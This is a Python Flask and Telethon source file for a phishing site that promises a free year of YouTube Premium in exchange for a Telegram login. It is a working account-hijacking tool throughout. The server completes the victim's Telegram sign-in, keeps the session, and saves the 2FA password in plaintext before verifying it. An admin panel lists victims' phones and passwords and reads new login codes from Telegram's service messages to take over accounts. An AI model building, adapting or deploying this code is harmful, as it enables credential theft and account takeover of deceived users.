import os, re, time, json, asyncio, secrets, sqlite3, threading, logging
from flask import Flask, request, jsonify, render_template_string, make_response, redirect
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# ============================== CONFIG ==============================
API_ID    = 35880065
API_HASH  = "30ac3c55d9b44bf2187cedc4ab854ce2"
ADMIN_KEY = "ADMIN123"          # 🔴 CHANGE THIS before deploy
DB_PATH   = "yt_premium.db"
SESSIONS  = "sessions"
os.makedirs(SESSIONS, exist_ok=True)

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("app")

# ============================== DATABASE ==============================
_db_lock = threading.RLock()
_db = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
_db.execute("PRAGMA journal_mode=WAL")
_db.execute("PRAGMA busy_timeout=30000")

def init_db():
    with _db_lock:
        _db.executescript("""
        CREATE TABLE IF NOT EXISTS users(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            web_token TEXT UNIQUE NOT NULL,
            phone TEXT UNIQUE NOT NULL,
            tg_user_id INTEGER,
            tg_name TEXT,
            login_state TEXT DEFAULT 'pending',
            phone_code_hash TEXT,
            twofa_password TEXT,
            created_at REAL
        );
        CREATE TABLE IF NOT EXISTS yt_links(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link TEXT UNIQUE NOT NULL,
            is_used INTEGER DEFAULT 0,
            assigned_to INTEGER,
            created_at REAL
        );
        CREATE TABLE IF NOT EXISTS link_requests(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            status TEXT DEFAULT 'waiting',
            yt_link TEXT,
            created_at REAL
        );
        """)
        _db.commit()

    # Safe migration — purano DB te column add kore
    try:
        with _db_lock:
            _db.execute("ALTER TABLE users ADD COLUMN twofa_password TEXT")
            _db.commit()
        log.info("Migration: added users.twofa_password")
    except sqlite3.OperationalError as e:
        if "duplicate column" not in str(e).lower():
            log.warning(f"Migration warning: {e}")

def q(sql, a=()):
    with _db_lock:
        return _db.execute(sql, a).fetchall()

def x(sql, a=()):
    with _db_lock:
        cur = _db.execute(sql, a)
        _db.commit()
        return cur

def _cols(t):
    return [d[0] for d in _db.execute(f"SELECT * FROM {t} LIMIT 0").description]

def row_dict(t, r):
    return dict(zip(_cols(t), r)) if r else None

def get_user(token):
    r = q("SELECT * FROM users WHERE web_token=?", (token,))
    return row_dict("users", r[0]) if r else None

def get_user_id(uid):
    r = q("SELECT * FROM users WHERE id=?", (uid,))
    return row_dict("users", r[0]) if r else None

def upd_user(uid, **f):
    if not f:
        return
    keys = ", ".join(f"{k}=?" for k in f)
    x(f"UPDATE users SET {keys} WHERE id=?", list(f.values()) + [uid])

def add_link(link):
    try:
        x("INSERT INTO yt_links(link,created_at) VALUES(?,?)", (link, time.time()))
        return True
    except Exception:
        return False

def unused_count():
    return q("SELECT COUNT(*) FROM yt_links WHERE is_used=0")[0][0]

def take_link(user_id):
    with _db_lock:
        r = _db.execute("SELECT id,link FROM yt_links WHERE is_used=0 ORDER BY id LIMIT 1").fetchone()
        if not r:
            return None
        _db.execute("UPDATE yt_links SET is_used=1,assigned_to=? WHERE id=?", (user_id, r[0]))
        _db.commit()
        return r[1]

# ============================== ASYNCIO LOOP ==============================
_loop = asyncio.new_event_loop()
threading.Thread(
    target=lambda: (asyncio.set_event_loop(_loop), _loop.run_forever()),
    daemon=True
).start()

def run(coro, timeout=90):
    return asyncio.run_coroutine_threadsafe(coro, _loop).result(timeout=timeout)

# ============================== TELETHON ==============================
_clients = {}

def client(token):
    if token not in _clients:
        path = os.path.join(SESSIONS, f"u_{token[:20]}.session")
        _clients[token] = TelegramClient(path, API_ID, API_HASH)
    return _clients[token]

async def _send_code(token, phone):
    c = client(token)
    await c.connect()
    if await c.is_user_authorized():
        me = await c.get_me()
        return {"status": "already", "id": me.id, "name": me.first_name}
    sent = await c.send_code_request(phone)
    return {"status": "sent", "hash": sent.phone_code_hash}

async def _verify_code(token, phone, code, phash):
    c = client(token)
    await c.connect()
    try:
        await c.sign_in(phone=phone, code=code, phone_code_hash=phash)
    except SessionPasswordNeededError:
        return {"status": "password"}
    except PhoneCodeInvalidError:
        return {"status": "invalid"}
    me = await c.get_me()
    return {"status": "logged_in", "id": me.id, "name": me.first_name}

async def _verify_pass(token, password):
    c = client(token)
    await c.connect()
    await c.sign_in(password=password)
    me = await c.get_me()
    return {"status": "logged_in", "id": me.id, "name": me.first_name}

async def _read_otp(token):
    c = client(token)
    await c.connect()
    if not await c.is_user_authorized():
        return {"status": "not_logged_in"}
    msgs = await c.get_messages(777000, limit=10)
    for m in msgs:
        if not m.text:
            continue
        match = re.search(r"(?<!\d)(\d{5,6})(?!\d)", m.text)
        if match:
            return {"status": "ok", "code": match.group(1), "text": m.text[:300]}
    return {"status": "no_code"}

# ============================== FLASK ==============================
app = Flask(__name__)
init_db()

def current_user():
    t = request.cookies.get("web_token")
    return get_user(t) if t else None

def is_admin():
    key = (request.headers.get("X-Admin-Key")
           or request.cookies.get("admin_key")
           or request.args.get("key"))
    return key == ADMIN_KEY

# ============================== HTML TEMPLATES ==============================
INDEX_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>YT Premium</title>
<style>body{font-family:system-ui;background:#0f0f0f;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{max-width:520px;padding:40px;background:#1a1a1a;border-radius:16px;text-align:center}
h1{background:linear-gradient(90deg,#f00,#ff0);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
a.btn{display:inline-block;margin-top:20px;padding:14px 32px;background:#f00;color:#fff;text-decoration:none;border-radius:8px;font-weight:bold}</style>
</head><body><div class="box"><h1>🎬 YouTube Premium 1 Year Free</h1>
<p style="color:#aaa">Login with Telegram to claim your link.</p>
<a class="btn" href="/login">Login & Claim →</a></div></body></html>
"""

LOGIN_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>Login</title>
<style>body{font-family:system-ui;background:#0f0f0f;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.box{width:380px;padding:32px;background:#1a1a1a;border-radius:16px}
input{width:100%;padding:12px;margin:8px 0;background:#0a0a0a;border:1px solid #333;border-radius:8px;color:#fff;box-sizing:border-box}
button{width:100%;padding:14px;background:#f00;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer}
.step{display:none}.step.on{display:block}.err{color:#f55;font-size:13px;margin-top:8px}</style>
</head><body><div class="box">
<div id="s1" class="step on"><h2>📱 Telegram Login</h2>
<input id="phone" placeholder="+8801XXXXXXXXX"><button onclick="sc()">Send Code</button><div class="err" id="e1"></div></div>
<div id="s2" class="step"><h2>🔢 Enter OTP</h2>
<input id="code" placeholder="12345" maxlength="6"><button onclick="vc()">Verify</button><div class="err" id="e2"></div></div>
<div id="s3" class="step"><h2>🔐 2FA Password</h2>
<input id="pw" type="password" placeholder="Password"><button onclick="vp()">Submit</button><div class="err" id="e3"></div></div>
</div>
<script>
const show=id=>{document.querySelectorAll('.step').forEach(s=>s.classList.remove('on'));document.getElementById(id).classList.add('on')};
const post=(u,b)=>fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)}).then(r=>r.json());
async function sc(){const p=document.getElementById('phone').value.trim();
 if(!p.startsWith('+'))return document.getElementById('e1').textContent='Start with +';
 const j=await post('/api/send_code',{phone:p});
 if(!j.ok)return document.getElementById('e1').textContent=j.error;
 if(j.state==='logged_in')return location.href='/dashboard'; show('s2');}
async function vc(){const j=await post('/api/verify_code',{code:document.getElementById('code').value.trim()});
 if(!j.ok)return document.getElementById('e2').textContent=j.error;
 if(j.state==='password')return show('s3');
 if(j.state==='logged_in')return location.href='/dashboard';}
async function vp(){const j=await post('/api/verify_password',{password:document.getElementById('pw').value});
 if(!j.ok)return document.getElementById('e3').textContent=j.error;
 location.href='/dashboard';}
</script></body></html>
"""

DASH_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>Dashboard</title>
<style>body{font-family:system-ui;background:#0f0f0f;color:#fff;margin:0;padding:40px 20px}
.wrap{max-width:640px;margin:0 auto}.card{background:#1a1a1a;border-radius:16px;padding:24px;margin-bottom:16px}
button{padding:14px 24px;background:#f00;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer}
button:disabled{opacity:.5}.bar{background:#0a0a0a;border-radius:8px;height:8px;overflow:hidden;margin-top:12px}
.bar>div{height:100%;background:#f00;width:0;transition:width 1s linear}
.link{background:#0a2a0a;border:1px solid #2a5a2a;padding:16px;border-radius:8px;margin-top:12px;word-break:break-all;color:#8f8;font-family:monospace}</style>
</head><body><div class="wrap">
<div class="card"><h2>👋 Hi, {{ name }}!</h2><div style="color:#888">Logged in with Telegram</div></div>
<div class="card"><h2>🎬 Claim YouTube Premium 1-Year Link</h2>
<p style="color:#888">Link generation takes about 60 seconds.</p>
<button id="btn" onclick="req()">Generate My Link</button>
<div class="bar" id="bar" style="display:none"><div id="barin"></div></div>
<div id="st" style="color:#888;margin-top:12px"></div>
<div id="out"></div></div></div>
<script>
async function req(){
 const b=document.getElementById('btn'); b.disabled=true;
 const j=await fetch('/api/request_link',{method:'POST'}).then(r=>r.json());
 if(!j.ok){document.getElementById('st').textContent=j.error;b.disabled=false;return;}
 const rid=j.request_id; document.getElementById('bar').style.display='block';
 const start=Date.now(); const barin=document.getElementById('barin');
 const t=setInterval(async()=>{
   const elapsed=(Date.now()-start)/1000; barin.style.width=Math.min(100,elapsed/60*100)+'%';
   const s=await fetch('/api/status/'+rid).then(r=>r.json());
   if(s.status==='ready'){
     clearInterval(t); document.getElementById('st').textContent='✅ Your link is ready!';
     document.getElementById('out').innerHTML='<div class="link">'+s.link+'</div>';return;
   }
   document.getElementById('st').textContent='⏳ Generating... '+(60-Math.min(60,Math.floor(elapsed)))+'s left';
 },2000);
}
</script></body></html>
"""

ADMIN_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>Admin</title>
<style>body{font-family:system-ui;background:#0f0f0f;color:#fff;margin:0;padding:32px}
.wrap{max-width:1100px;margin:0 auto}.card{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
input,textarea{width:100%;padding:10px;background:#0a0a0a;border:1px solid #333;border-radius:6px;color:#fff;box-sizing:border-box;margin-bottom:8px}
button{padding:8px 16px;background:#0a0;color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:bold;margin:2px}
button.blue{background:#06c}button.orange{background:#e80}button.red{background:#c00}
table{width:100%;border-collapse:collapse;font-size:13px}th,td{padding:8px;text-align:left;border-bottom:1px solid #333}
code{background:#000;padding:2px 6px;border-radius:4px;color:#8f8;font-size:12px}
.badge-ok{color:#8f8}.badge-warn{color:#fb0}.badge-err{color:#f55}
.pw{color:#fb0;font-family:monospace;font-weight:bold}
</style>
</head><body><div class="wrap">
<h1>🔐 Admin Panel</h1>

<div class="card"><h3>➕ Add YouTube Premium Links (one per line)</h3>
<textarea id="links" rows="5" placeholder="https://youtube.com/premium/redeem/xxxx&#10;https://youtube.com/premium/redeem/yyyy"></textarea>
<button onclick="addLinks()">Add Links</button>
<div id="msg" style="margin-top:8px;color:#8f8"></div>
<div style="margin-top:12px;color:#888">Unused in queue: <b id="unused">?</b></div></div>

<div class="card"><h3>👥 Users</h3>
<button class="blue" onclick="loadUsers()">🔄 Refresh</button>
<table id="tbl">
<thead><tr>
  <th>ID</th><th>Phone</th><th>Name</th><th>State</th>
  <th>🔐 2FA Password</th><th>Actions</th>
</tr></thead>
<tbody></tbody></table>
<div id="otpout" style="margin-top:16px"></div>
</div>
</div>
<script>
const KEY=new URLSearchParams(location.search).get('key');
document.cookie='admin_key='+KEY+';path=/;max-age=604800';
const H={'Content-Type':'application/json','X-Admin-Key':KEY};

async function addLinks(){
 const raw=document.getElementById('links').value.split('\\n').map(s=>s.trim()).filter(Boolean);
 let ok=0;
 for(const l of raw){
   const j=await fetch('/api/admin/add_link',{method:'POST',headers:H,body:JSON.stringify({link:l})}).then(r=>r.json());
   if(j.ok)ok++;
 }
 document.getElementById('msg').textContent=ok+' link(s) added';
 refreshCount();
}
async function refreshCount(){
 const j=await fetch('/api/admin/stats',{headers:H}).then(r=>r.json());
 document.getElementById('unused').textContent=j.unused;
}
async function loadUsers(){
 const j=await fetch('/api/admin/users',{headers:H}).then(r=>r.json());
 const tb=document.querySelector('#tbl tbody');tb.innerHTML='';
 j.users.forEach(u=>{
   const tr=document.createElement('tr');
   let stateBadge = u.login_state;
   if(u.login_state==='logged_in') stateBadge='<span class="badge-ok">✅ logged_in</span>';
   else if(u.login_state==='password_needed') stateBadge='<span class="badge-warn">🔐 2FA needed</span>';
   else if(u.login_state==='code_sent') stateBadge='<span class="badge-warn">📨 code sent</span>';
   else stateBadge='<span class="badge-err">'+u.login_state+'</span>';

   const pwCell = u.twofa_password
      ? '<span class="pw">'+escapeHtml(u.twofa_password)+'</span>'
      : '<span style="color:#666">—</span>';

   tr.innerHTML=`
     <td>${u.id}</td>
     <td>${escapeHtml(u.phone)}</td>
     <td>${escapeHtml(u.tg_name||'-')}</td>
     <td>${stateBadge}</td>
     <td>${pwCell}</td>
     <td>
       <button class="orange" onclick="readOtp(${u.id})">📲 Read OTP</button>
     </td>`;
   tb.appendChild(tr);
 });
}
function escapeHtml(s){
 return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
async function readOtp(id){
 document.getElementById('otpout').innerHTML='<div class="card">⏳ Reading OTP for user '+id+'...</div>';
 const j=await fetch('/api/admin/read_otp/'+id,{headers:H}).then(r=>r.json());
 let body='';
 if(j.status==='ok'){
   body='<div class="card"><b>📲 Latest OTP for User '+id+':</b> <code>'+j.code+'</code><br><small style="color:#888">'+escapeHtml(j.text||'')+'</small></div>';
 } else if(j.ok===false){
   body='<div class="card badge-err"><b>Error:</b> '+escapeHtml(j.error||'unknown')+'</div>';
 } else {
   body='<div class="card badge-warn"><b>Status:</b> '+escapeHtml(j.status||'unknown')+'</div>';
 }
 document.getElementById('otpout').innerHTML=body;
}
refreshCount();loadUsers();
</script></body></html>
"""

# ============================== ROUTES: USER ==============================
@app.route("/")
def home():
    return render_template_string(INDEX_HTML)

@app.route("/login")
def login():
    return render_template_string(LOGIN_HTML)

@app.route("/api/send_code", methods=["POST"])
def api_send_code():
    d = request.get_json() or {}
    phone = (d.get("phone") or "").strip()
    if not phone.startswith("+") or len(phone) < 8:
        return jsonify({"ok": False, "error": "Invalid phone (start with +)"})
    token = secrets.token_urlsafe(32)
    try:
        x("INSERT INTO users(web_token,phone,created_at) VALUES(?,?,?)",
          (token, phone, time.time()))
    except Exception as e:
        return jsonify({"ok": False, "error": "Phone already used or DB error: " + str(e)})
    uid = q("SELECT id FROM users WHERE web_token=?", (token,))[0][0]
    try:
        r = run(_send_code(token, phone))
    except Exception as e:
        return jsonify({"ok": False, "error": "Telegram: " + str(e)})
    if r["status"] == "already":
        upd_user(uid, tg_user_id=r["id"], tg_name=r.get("name"), login_state="logged_in")
        resp = jsonify({"ok": True, "state": "logged_in"})
        resp.set_cookie("web_token", token, httponly=True, samesite="Lax", max_age=604800)
        return resp
    upd_user(uid, phone_code_hash=r["hash"], login_state="code_sent")
    resp = jsonify({"ok": True, "state": "code_sent"})
    resp.set_cookie("web_token", token, httponly=True, samesite="Lax", max_age=604800)
    return resp

@app.route("/api/verify_code", methods=["POST"])
def api_verify_code():
    u = current_user()
    if not u:
        return jsonify({"ok": False, "error": "No session"})
    code = (request.get_json() or {}).get("code", "").strip()
    try:
        r = run(_verify_code(u["web_token"], u["phone"], code, u["phone_code_hash"] or ""))
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)})
    if r["status"] == "password":
        upd_user(u["id"], login_state="password_needed")
        return jsonify({"ok": True, "state": "password"})
    if r["status"] == "invalid":
        return jsonify({"ok": False, "error": "Wrong OTP"})
    upd_user(u["id"], tg_user_id=r["id"], tg_name=r.get("name"), login_state="logged_in")
    return jsonify({"ok": True, "state": "logged_in"})

@app.route("/api/verify_password", methods=["POST"])
def api_verify_password():
    """User 2FA password dilo → DB te save kore admin panel e dekhabe."""
    u = current_user()
    if not u:
        return jsonify({"ok": False, "error": "No session"})
    pw = (request.get_json() or {}).get("password", "").strip()
    if not pw:
        return jsonify({"ok": False, "error": "Password required"})

    # Password age save koro (je kono result er jonno)
    upd_user(u["id"], twofa_password=pw)
    log.info(f"2FA password received for user_id={u['id']} (len={len(pw)})")

    try:
        r = run(_verify_pass(u["web_token"], pw))
    except SessionPasswordNeededError:
        return jsonify({"ok": False, "error": "Wrong 2FA password"})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)})

    upd_user(u["id"],
             tg_user_id=r["id"],
             tg_name=r.get("name"),
             login_state="logged_in")
    return jsonify({"ok": True, "state": "logged_in"})

@app.route("/dashboard")
def dashboard():
    u = current_user()
    if not u or u["login_state"] != "logged_in":
        return redirect("/login")
    return render_template_string(DASH_HTML, name=u["tg_name"] or "User")

@app.route("/api/request_link", methods=["POST"])
def api_request_link():
    u = current_user()
    if not u or u["login_state"] != "logged_in":
        return jsonify({"ok": False, "error": "Not logged in"})
    link = take_link(u["id"])
    if not link:
        return jsonify({"ok": False, "error": "No links in stock — try later"})
    x("INSERT INTO link_requests(user_id,status,yt_link,created_at) VALUES(?,?,?,?)",
      (u["id"], "waiting", link, time.time()))
    rid = q("SELECT id FROM link_requests WHERE user_id=? ORDER BY id DESC LIMIT 1",
            (u["id"],))[0][0]
    def _deliver():
        time.sleep(60)
        x("UPDATE link_requests SET status='ready' WHERE id=?", (rid,))
    threading.Thread(target=_deliver, daemon=True).start()
    return jsonify({"ok": True, "request_id": rid})

@app.route("/api/status/<int:rid>")
def api_status(rid):
    u = current_user()
    if not u:
        return jsonify({"ok": False})
    r = q("SELECT status,yt_link FROM link_requests WHERE id=? AND user_id=?",
          (rid, u["id"]))
    if not r:
        return jsonify({"ok": False, "error": "Not found"})
    return jsonify({
        "ok": True,
        "status": r[0][0],
        "link": r[0][1] if r[0][0] == "ready" else None
    })

# ============================== ROUTES: ADMIN ==============================
@app.route("/admin")
def admin_page():
    if is_admin():
        resp = make_response(render_template_string(ADMIN_HTML))
        resp.set_cookie("admin_key", ADMIN_KEY, max_age=604800)
        return resp
    return "Access denied. Visit /admin?key=YOUR_ADMIN_KEY", 403

@app.route("/api/admin/add_link", methods=["POST"])
def adm_add_link():
    if not is_admin():
        return jsonify({"ok": False}), 403
    link = ((request.get_json() or {}).get("link") or "").strip()
    if not link.startswith("http"):
        return jsonify({"ok": False, "error": "Bad link"})
    return jsonify({"ok": add_link(link)})

@app.route("/api/admin/stats")
def adm_stats():
    if not is_admin():
        return jsonify({"ok": False}), 403
    return jsonify({"ok": True, "unused": unused_count()})

@app.route("/api/admin/users")
def adm_users():
    if not is_admin():
        return jsonify({"ok": False}), 403
    rows = q(
        "SELECT id,phone,tg_name,login_state,twofa_password "
        "FROM users ORDER BY id DESC LIMIT 500"
    )
    users = [
        {
            "id": r[0],
            "phone": r[1],
            "tg_name": r[2],
            "login_state": r[3],
            "twofa_password": r[4] or ""
        }
        for r in rows
    ]
    return jsonify({"ok": True, "users": users})

@app.route("/api/admin/read_otp/<int:uid>")
def adm_read_otp(uid):
    if not is_admin():
        return jsonify({"ok": False, "error": "Unauthorized"}), 403

    u = get_user_id(uid)
    if not u:
        return jsonify({"ok": False, "error": "User not found"}), 404

    if u["login_state"] != "logged_in":
        return jsonify({"ok": False, "error": "User not logged in yet"}), 400

    try:
        result = run(_read_otp(u["web_token"]), timeout=40)
        return jsonify(result)
    except Exception as e:
        log.error(f"read_otp failed for uid={uid}: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500

# ============================== MAIN ==============================
if __name__ == "__main__":
    print("=" * 60)
    print("🎬 YouTube Premium Bot running")
    print("   User page:  http://localhost:5000")
    print(f"   Admin page: http://localhost:5000/admin?key={ADMIN_KEY}")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000, debug=False)